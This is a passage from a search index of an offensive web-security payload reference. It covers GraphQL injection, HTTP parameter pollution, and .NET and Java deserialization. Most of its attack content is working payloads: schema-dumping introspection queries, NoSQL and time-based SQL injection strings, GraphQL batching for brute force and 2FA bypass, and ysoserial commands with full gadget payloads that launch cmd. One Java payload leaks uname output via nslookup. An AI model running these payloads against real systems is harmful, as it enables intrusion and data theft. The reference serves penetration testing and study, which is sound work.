Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos</li> <li>Baby^H Master PHP 2017 by @orangetw</li> <li>\u0427\u0442\u0435\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u043e\u0432 =&gt; unserialize !</li> <li>New PHP Exploitation Technique - 14 Aug 2018 by Dr. Johannes Dahse</li> <li>It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It, Sam Thomas</li> <li>CVV #1: Local File Inclusion - @SI9INT - Jun 20, 2018</li> <li>Exploiting Remote File Inclusion (RFI) in PHP application and bypassing remote URL inclusion restriction</li> <li>PHP LFI with Nginx Assistance</li> <li>PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - gynvael.coldwind - 2011-03-18</li> <li>LFI2RCE via PHP Filters - HackTricks</li> <li>Solving \"includer's revenge\" from hxp ctf 2021 without controlling any files - @loknop</li> <li>PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - R\u00e9mi Matasse - 18/10/2022</li> </ul>"},{"location":"GraphQL%20Injection/","title":"GraphQL Injection","text":"<p>GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. A GraphQL service is created by defining types and fields on those types, then providing functions for each field on each type</p>"},{"location":"GraphQL%20Injection/#summary","title":"Summary","text":"<ul> <li>GraphQL injection</li> <li>Summary</li> <li>Tools</li> <li>Exploit<ul> <li>Identify an injection point</li> <li>Enumerate Database Schema via Introspection</li> <li>List path</li> <li>Extract data</li> <li>Extract data using edges/nodes</li> <li>Extract data using projections</li> <li>Enumerate the types' definition</li> <li>Use mutations</li> <li>NOSQL injection</li> <li>SQL injection</li> <li>GraphQL Batching Attacks</li> </ul> </li> <li>References</li> </ul>"},{"location":"GraphQL%20Injection/#tools","title":"Tools","text":"<ul> <li>swisskyrepo/GraphQLmap - Scripting engine to interact with a graphql endpoint for pentesting purposes</li> <li>doyensec/graph-ql - GraphQL Security Research Material</li> <li>doyensec/inql - A Burp Extension for GraphQL Security Testing</li> <li>dee-see/graphql-path-enum - Lists the different ways of reaching a given type in a GraphQL schema</li> <li>andev-software/graphql-ide - An extensive IDE for exploring GraphQL API's</li> <li>mchoji/clairvoyancex - Obtain GraphQL API schema despite disabled introspection</li> <li>nicholasaleks/CrackQL - A GraphQL password brute-force and fuzzing utility</li> <li>nicholasaleks/graphql-threat-matrix - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations</li> <li>dolevf/graphql-cop - Security Auditor Utility for GraphQL APIs</li> <li>IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph</li> <li>Insomnia - Cross-platform HTTP and GraphQL Client</li> </ul>"},{"location":"GraphQL%20Injection/#exploit","title":"Exploit","text":""},{"location":"GraphQL%20Injection/#identify-an-injection-point","title":"Identify an injection point","text":"<p>Most of the time the graphql is located on the <code>/graphql</code> or <code>/graphiql</code> endpoint.</p> <pre><code>example.com/graphql?query={__schema{types{name}}}\nexample.com/graphiql?query={__schema{types{name}}}\n</code></pre> <p>Check if errors are visible.</p> <pre><code>?query={__schema}\n?query={}\n?query={thisdefinitelydoesnotexist}\n</code></pre>"},{"location":"GraphQL%20Injection/#enumerate-database-schema-via-introspection","title":"Enumerate Database Schema via Introspection","text":"<p>URL encoded query to dump the database schema.</p> <pre><code>fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}\n</code></pre> <p>URL decoded query to dump the database schema.</p> <pre><code>fragment FullType on __Type {\nkind\nname\ndescription\nfields(includeDeprecated: true) {\nname\ndescription\nargs {\n...InputValue\n}\ntype {\n...TypeRef\n}\nisDeprecated\ndeprecationReason\n}\ninputFields {\n...InputValue\n}\ninterfaces {\n...TypeRef\n}\nenumValues(includeDeprecated: true) {\nname\ndescription\nisDeprecated\ndeprecationReason\n}\npossibleTypes {\n...TypeRef\n}\n}\nfragment InputValue on __InputValue {\nname\ndescription\ntype {\n...TypeRef\n}\ndefaultValue\n}\nfragment TypeRef on __Type {\nkind\nname\nofType {\nkind\nname\nofType {\nkind\nname\nofType {\nkind\nname\nofType {\nkind\nname\nofType {\nkind\nname\nofType {\nkind\nname\nofType {\nkind\nname\n}\n}\n}\n}\n}\n}\n}\n}\nquery IntrospectionQuery {\n__schema {\nqueryType {\nname\n}\nmutationType {\nname\n}\ntypes {\n...FullType\n}\ndirectives {\nname\ndescription\nlocations\nargs {\n...InputValue\n}\n}\n}\n}\n</code></pre> <p>Single line query to dump the database schema without fragments.</p> <pre><code>__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}\n</code></pre>"},{"location":"GraphQL%20Injection/#list-path","title":"List path","text":"<pre><code>$ git clone https://gitlab.com/dee-see/graphql-path-enum\n$ graphql-path-enum -i ./test_data/h1_introspection.json -t Skill\nFound 27 ways to reach the \"Skill\" node from the \"Query\" node:\n- Query (assignable_teams) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (checklist_check) -&gt; ChecklistCheck (checklist) -&gt; Checklist (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (checklist_check_response) -&gt; ChecklistCheckResponse (checklist_check) -&gt; ChecklistCheck (checklist) -&gt; Checklist (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (checklist_checks) -&gt; ChecklistCheck (checklist) -&gt; Checklist (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (clusters) -&gt; Cluster (weaknesses) -&gt; Weakness (critical_reports) -&gt; TeamMemberGroupConnection (edges) -&gt; TeamMemberGroupEdge (node) -&gt; TeamMemberGroup (team_members) -&gt; TeamMember (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (embedded_submission_form) -&gt; EmbeddedSubmissionForm (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (external_program) -&gt; ExternalProgram (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (external_programs) -&gt; ExternalProgram (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (job_listing) -&gt; JobListing (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (job_listings) -&gt; JobListing (team) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (me) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (pentest) -&gt; Pentest (lead_pentester) -&gt; Pentester (user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (pentests) -&gt; Pentest (lead_pentester) -&gt; Pentester (user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (query) -&gt; Query (assignable_teams) -&gt; Team (audit_log_items) -&gt; AuditLogItem (source_user) -&gt; User (pentester_profile) -&gt; PentesterProfile (skills) -&gt; Skill\n- Query (query) -&gt; Query (skills) -&gt; Skill\n</code></pre>"},{"location":"GraphQL%20Injection/#extract-data","title":"Extract data","text":"<pre><code>example.com/graphql?query={TYPE_1{FIELD_1,FIELD_2}}\n</code></pre>"},{"location":"GraphQL%20Injection/#extract-data-using-edgesnodes","title":"Extract data using edges/nodes","text":"<pre><code>{\n\"query\": \"query {\n    teams{\n      total_count,edges{\n        node{\n          id,_id,about,handle,state\n        }\n      }\n    }\n  }\"\n} </code></pre>"},{"location":"GraphQL%20Injection/#extract-data-using-projections","title":"Extract data using projections","text":"<p> Don\u2019t forget to escape the \" inside the options.</p> <pre><code>{doctors(options: \"{\\\"patients.ssn\\\" :1}\"){firstName lastName id patients{ssn}}}\n</code></pre>"},{"location":"GraphQL%20Injection/#enumerate-the-types-definition","title":"Enumerate the types' definition","text":"<p>Enumerate the definition of interesting types using the following GraphQL query, replacing \"User\" with the chosen type</p> <pre><code>{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}\n</code></pre>"},{"location":"GraphQL%20Injection/#use-mutations","title":"Use mutations","text":"<p>Mutations work like function, you can use them to interact with the GraphQL.</p> <pre><code># mutation{signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){token}}\n# mutation{addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {id name email}}\n</code></pre>"},{"location":"GraphQL%20Injection/#nosql-injection","title":"NOSQL injection","text":"<p>Use <code>$regex</code>, <code>$ne</code> from  inside a <code>search</code> parameter.</p> <pre><code>{\ndoctors(\noptions: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\", search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\")\n{\nfirstName lastName id patients{ssn}\n}\n}\n</code></pre>"},{"location":"GraphQL%20Injection/#sql-injection","title":"SQL injection","text":"<p>Send a single quote <code>'</code> inside a graphql parameter to trigger the SQL injection</p> <pre><code>{ \nbacon(id: \"1'\") { \nid, \ntype, \nprice\n}\n}\n</code></pre> <p>Simple SQL injection inside a graphql field.</p> <pre><code>curl -X POST http://localhost:8080/graphql\\?embedded_submission_form_uuid\\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\\(30\\)%3B--%27\n</code></pre>"},{"location":"GraphQL%20Injection/#graphql-batching-attacks","title":"GraphQL Batching Attacks","text":"<p>Common scenario: * Password Brute-force Amplification Scenario * 2FA bypassing</p> <pre><code>mutation finishChannelVerificationMutation(\n$input FinishChannelVerificationInput!,\n$input2 FinishChannelVerificationInput!,\n$input3 FinishChannelVerificationInput!,\n){\nfirst: finishChannelVerificationMutation(input: $input){\nchannel{\nid\noption{\n... onChannelSmsOptions{\nnumber\n}\n}\nstatus\nnotificationSubscription(last: 1000){ etc...  }\n}\n}\nsecond: finishChannelVerificationMutation(input: $input2){...}\nthird: finishChannelVerificationMutation(input: $input3){...}\n}\n</code></pre>"},{"location":"GraphQL%20Injection/#references","title":"References","text":"<ul> <li>Introduction to GraphQL</li> <li>GraphQL Introspection</li> <li>API Hacking GraphQL - @ghostlulz - jun 8, 2019</li> <li>GraphQL abuse: Bypass account level permissions through parameter smuggling - March 14, 2018 - @Detectify</li> <li>Discovering GraphQL endpoints and SQLi vulnerabilities - Sep 23, 2018 - Mat\u00edas Choren</li> <li>Securing Your GraphQL API from Malicious Queries - Feb 21, 2018 - Max Stoiber</li> <li>GraphQL NoSQL Injection Through JSON Types - June 12, 2017 - Pete Corey</li> <li>SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter - Nov 6th 2018 - @jobert</li> <li>Looting GraphQL Endpoints for Fun and Profit - @theRaz0r</li> <li>How to set up a GraphQL Server using Node.js, Express &amp; MongoDB - 5 NOVEMBER 2018 - Leonardo Maldonado</li> <li>GraphQL cheatsheet - DEVHINTS.IO</li> <li>HIP19 Writeup - Meet Your Doctor 1,2,3 - June 22, 2019 - Swissky</li> <li>Introspection query leaks sensitive graphql system information - @Zuriel</li> <li>Graphql Bug to Steal Anyone\u2019s Address - Sept 1, 2019 - Pratik Yadav</li> <li>GraphQL Batching Attack - RENATAWALLARM - DECEMBER 13, 2019</li> <li>GraphQL for Pentesters presentation by ACCEIS - 01/12/2022 - source</li> </ul>"},{"location":"HTTP%20Parameter%20Pollution/","title":"HTTP Parameter Pollution","text":""},{"location":"HTTP%20Parameter%20Pollution/#summary","title":"Summary","text":"<p>HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate web logics or retrieve hidden information. This evasion technique is based on splitting an attack vector between multiple instances of a parameter with the same name (?param1=value&amp;param1=value). As there is no formal way of parsing HTTP parameters, individual web technologies have their own unique way of parsing and reading URL parameters with the same name. Some taking the first occurrence, some taking the last occurrence, and some reading it as an array. This behavior is abused by the attacker in order to bypass pattern-based security mechanisms. </p>"},{"location":"HTTP%20Parameter%20Pollution/#tools","title":"Tools","text":"<p>No tools needed. Maybe Burp or OWASP ZAP.</p>"},{"location":"HTTP%20Parameter%20Pollution/#how-to-test","title":"How to test","text":"<p>HPP allows an attacker to bypass pattern based/black list proxies or Web Application Firewall detection mechanisms. This can be done with or without the knowledge of the web technology behind the proxy, and can be achieved through simple trial and error. </p> <pre><code>Example scenario.\nWAF - Reads first param\nOrigin Service - Reads second param. In this scenario, developer trusted WAF and did not implement sanity checks.\n\nAttacker -- http://example.com?search=Beth&amp;search=' OR 1=1;## --&gt; WAF (reads first 'search' param, looks innocent. passes on) --&gt; Origin Service (reads second 'search' param, injection happens if no checks are done here.)\n</code></pre>"},{"location":"HTTP%20Parameter%20Pollution/#table-of-reference-for-which-technology-reads-which-parameter","title":"Table of reference for which technology reads which parameter","text":"<p>When ?par1=a&amp;par1=b | Technology                                      | Parsing Result          |outcome (par1=)| | ------------------                              |---------------          |:-------------:| | ASP.NET/IIS                                     |All occurrences          |a,b            | | ASP/IIS                                         |All occurrences          |a,b            | | PHP/Apache                                      |Last occurrence          |b              | | PHP/Zues                                        |Last occurrence          |b              | | JSP,Servlet/Tomcat                              |First occurrence         |a              | | Perl CGI/Apache                                 |First occurrence         |a              | | Python Flask                                    |First occurrence         |a              | | Python Django                                   |Last occurrence          |b              | | Nodejs                                          |All occurrences          |a,b            | | Golang net/http - <code>r.URL.Query().Get(\"param\")</code>  |First occurrence         |a              | | Golang net/http - <code>r.URL.Query()[\"param\"]</code>      |All occurrences          |a,b            | | IBM Lotus Domino                                |First occurrence         |a              | | IBM HTTP Server                                 |First occurrence         |a              | | Perl CGI/Apache                                 |First occurrence         |a              | | mod_wsgi (Python)/Apache                        |First occurrence         |a              | | Python/Zope                                     |All occurrences in array  |['a','b']      | | Ruby on Rails                                   |Last occurrence          |b              |</p>"},{"location":"HTTP%20Parameter%20Pollution/#references","title":"References","text":"<ul> <li>HTTP Parameter Pollution - Imperva</li> <li>HTTP Parameter Pollution in 11 minutes | Web Hacking - PwnFunction</li> <li>How to Detect HTTP Parameter Pollution Attacks - Acunetix</li> </ul>"},{"location":"Insecure%20Deserialization/","title":"Insecure Deserialization","text":"<p>Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object - OWASP</p> <p>Check the following sub-sections, located in other files :</p> <ul> <li>Java deserialization : ysoserial, ...</li> <li>PHP (Object injection) : phpggc, ...</li> <li>Ruby : universal rce gadget, ...</li> <li>Python : pickle, ...</li> <li>YAML : PyYAML, ...</li> <li>.NET : ysoserial.net, ...</li> </ul> Object Type Header (Hex) Header (Base64) Java Serialized AC ED rO .NET ViewState FF 01 /w Python Pickle 80 04 95 gASV PHP Serialized 4F 3A Tz"},{"location":"Insecure%20Deserialization/#pop-gadgets","title":"POP Gadgets","text":"<p>A POP (Property Oriented Programming) gadget is a piece of code implemented by an application's class, that can be called during the deserialization process.</p> <p>POP gadgets characteristics: * Can be serialized * Has public/accessible properties * Implements specific vulnerable methods * Has access to other \"callable\" classes</p>"},{"location":"Insecure%20Deserialization/#labs","title":"Labs","text":"<ul> <li>Portswigger - Insecure Deserialization</li> <li>NickstaDB/DeserLab - Java deserialization exploitation lab</li> </ul>"},{"location":"Insecure%20Deserialization/#references","title":"References","text":"<ul> <li>Github - frohoff/ysoserial</li> <li>Github - pwntester/ysoserial.net</li> <li>Java-Deserialization-Cheat-Sheet - GrrrDog</li> <li>Understanding &amp; practicing java deserialization exploits</li> <li>How i found a 1500$ worth Deserialization vulnerability - @D0rkerDevil</li> <li>Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter St\u00f6ckli</li> <li>PHP Object Injection - OWASP</li> <li>PHP Object Injection - Thin Ba Shane</li> <li>PHP unserialize</li> <li>PHP Generic Gadget - ambionics security</li> <li>RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke</li> <li>Java Deserialization in manager.paypal.com by Michael Stepankin</li> <li>Instagram's Million Dollar Bug by Wesley Wineberg </li> <li>Ruby Cookie Deserialization RCE on facebooksearch.algolia.com by Michiel Prins (michiel)</li> <li>Java deserialization by meals</li> <li>Diving into unserialize() - Sep 19- Vickie Li</li> <li>.NET Gadgets by Alvaro Mu\u00f1oz (@pwntester) &amp; OleksandrMirosh</li> <li>ExploitDB Introduction</li> <li>Exploiting insecure deserialization vulnerabilities - PortSwigger</li> </ul>"},{"location":"Insecure%20Deserialization/DotNET/","title":".NET Serialization","text":""},{"location":"Insecure%20Deserialization/DotNET/#summary","title":"Summary","text":"<ul> <li>Detection</li> <li>Tools</li> <li>Formatters<ul> <li>XmlSerializer</li> <li>DataContractSerializer</li> <li>NetDataContractSerializer</li> <li>LosFormatter</li> <li>JSON.NET</li> <li>BinaryFormatter</li> </ul> </li> <li>POP Gadgets</li> <li>References</li> </ul>"},{"location":"Insecure%20Deserialization/DotNET/#detection","title":"Detection","text":"<ul> <li><code>AAEAAD</code> (Hex) = .NET deserialization BinaryFormatter</li> <li><code>FF01</code> (Hex) / <code>/w</code> (Base64) = .NET ViewState</li> </ul> <p>Example: <code>AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=</code></p>"},{"location":"Insecure%20Deserialization/DotNET/#tools","title":"Tools","text":"<ul> <li>pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters <pre><code>$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s\n$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini\n$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t\n$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t\n</code></pre></li> </ul>"},{"location":"Insecure%20Deserialization/DotNET/#formatters","title":"Formatters","text":"<p>  .NET Native Formatters from pwntester/attacking-net-serialization</p>"},{"location":"Insecure%20Deserialization/DotNET/#xmlserializer","title":"XmlSerializer","text":"<ul> <li>In C# source code, look for <code>XmlSerializer(typeof(&lt;TYPE&gt;));</code>.</li> <li>The attacker must control the type of the XmlSerializer.</li> <li>Payload output: XML</li> </ul> <pre><code>.\\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c \"calc.exe\"\n&lt;?xml version=\"1.0\"?&gt;\n&lt;root type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"&gt;\n&lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" &gt;\n&lt;ExpandedElement/&gt;\n&lt;ProjectedProperty0&gt;\n&lt;MethodName&gt;Parse&lt;/MethodName&gt;\n&lt;MethodParameters&gt;\n&lt;anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\"&gt;\n&lt;![CDATA[&lt;ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:d=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:b=\"clr-namespace:System;assembly=mscorlib\" xmlns:c=\"clr-namespace:System.Diagnostics;assembly=system\"&gt;&lt;ObjectDataProvider d:Key=\"\" ObjectType=\"{d:Type c:Process}\" MethodName=\"Start\"&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc.exe&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;\n&lt;/anyType&gt;\n&lt;/MethodParameters&gt;\n&lt;ObjectInstance xsi:type=\"XamlReader\"&gt;&lt;/ObjectInstance&gt;\n&lt;/ProjectedProperty0&gt;\n&lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;\n&lt;/root&gt;\n</code></pre>"},{"location":"Insecure%20Deserialization/DotNET/#datacontractserializer","title":"DataContractSerializer","text":"<p>The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.</p> <ul> <li>In C# source code, look for <code>DataContractSerializer(typeof(&lt;TYPE&gt;))</code>.</li> <li>Payload output: XML</li> <li>Data Type must be user-controlled to be exploitable</li> </ul>"},{"location":"Insecure%20Deserialization/DotNET/#netdatacontractserializer","title":"NetDataContractSerializer","text":"<p>It extends the <code>System.Runtime.Serialization.XmlObjectSerializer</code> class and is capable of serializing any type annotated with serializable attribute as <code>BinaryFormatter</code>.</p> <ul> <li>In C# source code, look for <code>NetDataContractSerializer().ReadObject()</code>.</li> <li>Payload output: XML</li> </ul> <pre><code>.\\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t\n</code></pre>"},{"location":"Insecure%20Deserialization/DotNET/#losformatter","title":"LosFormatter","text":"<ul> <li>Use <code>BinaryFormatter</code> internally.</li> </ul> <pre><code>.\\ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c \"calc.exe\" -o base64 -t\n</code></pre>"},{"location":"Insecure%20Deserialization/DotNET/#jsonnet","title":"JSON.NET","text":"<ul> <li>In C# source code, look for <code>JsonConvert.DeserializeObject&lt;Expected&gt;(json, new JsonSerializerSettings</code>.</li> <li>Payload output: JSON</li> </ul> <pre><code>.\\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc.exe\" -t\n{\n'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', \n'MethodName':'Start',\n'MethodParameters':{\n'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n'$values':['cmd', '/c calc.exe']\n},\n'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\n}\n</code></pre>"},{"location":"Insecure%20Deserialization/DotNET/#binaryformatter","title":"BinaryFormatter","text":"<p>The BinaryFormatter type is dangerous and is not recommended for data processing. Applications should stop using BinaryFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. BinaryFormatter is insecure and can\u2019t be made secure.</p> <ul> <li>In C# source code, look for <code>System.Runtime.Serialization.Binary.BinaryFormatter</code>.</li> <li>Exploitation requires <code>[Serializable]</code> or <code>ISerializable</code> interface.</li> <li>Payload output: Binary</li> </ul> <pre><code>./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t\n</code></pre>"},{"location":"Insecure%20Deserialization/DotNET/#pop-gadgets","title":"POP Gadgets","text":"<p>These gadgets must have the following properties: * Serializable * Public/settable variables * Magic \"functions\": Get/Set, OnSerialisation, Constructors/Destructors</p> <p>You must carefully select your gadgets for a targeted formatter.</p> <p>List of popular gadgets used in common payloads. * ObjectDataProvider from <code>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\WPF\\PresentationFramework.dll</code>     * Use <code>MethodParameters</code> to set arbitrary parameters     * Use <code>MethodName</code> to call an arbitrary function  * ExpandedWrapper     * Specify the <code>object types</code> of the objects that are encapsulated     <pre><code>ExpandedWrapper&lt;Process, ObjectDataProvider&gt; myExpWrap = new ExpandedWrapper&lt;Process, ObjectDataProvider&gt;();\n</code></pre> * System.Configuration.Install.AssemblyInstaller     * Execute payload with Assembly.Load  <pre><code>// System.Configuration.Install.AssemblyInstaller\npublic void set_Path(string value){\nif (value == null){\nthis.assembly = null;\n}\nthis.assembly = Assembly.LoadFrom(value);\n}\n</code></pre></p>"},{"location":"Insecure%20Deserialization/DotNET/#references","title":"References","text":"<ul> <li>Attacking .NET Serialization - Alvaro - October 20, 2017</li> <li>Attacking .NET Deserialization - Alvaro Mu\u00f1oz - 28 avr. 2018</li> <li>Friday the 13th: JSON Attacks - Alvaro Mu\u00f1oz (@pwntester) Oleksandr Mirosh - Slides</li> <li>Friday the 13th: JSON Attacks - Alvaro Mu\u00f1oz (@pwntester) Oleksandr Mirosh - White Paper</li> <li>Friday the 13th: JSON Attacks - Alvaro Mu\u00f1oz (@pwntester) Oleksandr Mirosh - DEF CON 25 Conference</li> <li>ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - James Forshaw - Slides</li> <li>ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - James Forshaw - White Paper</li> <li>Now You Serial, Now You Don't - Systematically Hunting for Deserialization Exploits - ALYSSA RAHMANDEC</li> <li>Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - 04/2019</li> <li>Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022</li> <li>Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - hacktricks</li> <li>Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Nov 2, 2021 - Shubham Shah</li> <li>Finding a New DataContractSerializer RCE Gadget Chain - November 7, 2019 - dugisec</li> </ul>"},{"location":"Insecure%20Deserialization/Java/","title":"Java Deserialization","text":""},{"location":"Insecure%20Deserialization/Java/#detection","title":"Detection","text":"<ul> <li><code>\"AC ED 00 05\"</code> in Hex</li> <li><code>AC ED</code>: STREAM_MAGIC. Specifies that this is a serialization protocol.</li> <li><code>00 05</code>: STREAM_VERSION. The serialization version.</li> <li><code>\"rO0\"</code> in Base64</li> <li>Content-type = \"application/x-java-serialized-object\"</li> <li><code>\"H4sIAAAAAAAAAJ\"</code> in gzip(base64)</li> </ul>"},{"location":"Insecure%20Deserialization/Java/#tools","title":"Tools","text":""},{"location":"Insecure%20Deserialization/Java/#ysoserial","title":"Ysoserial","text":"<p>frohoff/ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</p> <pre><code>java -jar ysoserial.jar CommonsCollections1 calc.exe &gt; commonpayload.bin\njava -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin\njava -jar ysoserial.jar Groovy1 'ping 127.0.0.1' &gt; payload.bin\njava -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | base64\n</code></pre> <p>List of payloads included in ysoserial: <pre><code>Payload             Authors                                Dependencies                                                                                                                                                                                        \n-------             -------                                ------------                                                                                                                                                                                        \nAspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      \nBeanShell1          